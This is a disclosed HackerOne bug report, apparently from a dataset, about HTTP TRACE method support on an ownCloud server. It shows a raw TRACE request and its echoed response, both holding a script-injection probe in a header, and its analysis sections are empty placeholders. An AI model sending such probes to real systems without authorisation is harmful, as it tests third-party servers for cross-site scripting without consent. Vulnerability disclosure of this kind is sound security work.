---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '90601'
original_report_id: '90601'
title: '[s3.owncloud.com] Web Server HTTP Trace/Track Method Support'
weakness: Violation of Secure Design Principles
team_handle: owncloud
created_at: '2015-09-27T01:01:52.731Z'
disclosed_at: '2015-09-28T15:44:36.245Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- violation-of-secure-design-principles
---

# [s3.owncloud.com] Web Server HTTP Trace/Track Method Support

## Metadata

- HackerOne Report ID: 90601
- Weakness: Violation of Secure Design Principles
- Program: owncloud
- Disclosed At: 2015-09-28T15:44:36.245Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello. 
Not ineresting bug but you can fixed it as in #83837. (https://hackerone.com/reports/83837)

Request:
TRACE /gxDM8DATHA HTTP/1.1
Host: s3.owncloud.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
via: <script>alert('QualysXSS');</script>

Response:
TRACE /gxDM8DATHA HTTP/1.1
Host: s3.owncloud.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*
via: <script>alert('QualysXSS');</script>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
